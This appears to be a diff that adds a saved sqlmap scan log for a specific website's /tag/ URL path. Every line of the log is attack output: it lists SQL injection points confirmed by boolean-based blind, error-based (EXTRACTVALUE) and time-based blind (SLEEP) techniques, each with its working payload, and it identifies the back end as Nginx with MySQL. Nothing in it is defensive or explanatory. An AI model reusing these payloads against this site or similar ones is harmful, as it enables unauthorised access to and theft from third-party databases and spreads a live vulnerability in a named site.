@@ -1,0 +1,17 @@
+sqlmap identified the following injection point(s) with a total of 1097 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: http://www.fzym.com/tag/-1' OR 11611=6 AND 000260=000260 or '6mVOEY7y'='') OR NOT 1867=1867#
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: http://www.fzym.com/tag/-1' OR 11611=6 AND 000260=000260 or '6mVOEY7y'='') AND EXTRACTVALUE(5550,CONCAT(0x5c,0x7178787871,(SELECT (ELT(5550=5550,1))),0x717a6b6271))-- rEtU
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://www.fzym.com/tag/-1' OR 11611=6 AND 000260=000260 or '6mVOEY7y'='') AND (SELECT 9183 FROM (SELECT(SLEEP(5)))vWbE)-- qxLC
+---
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.1
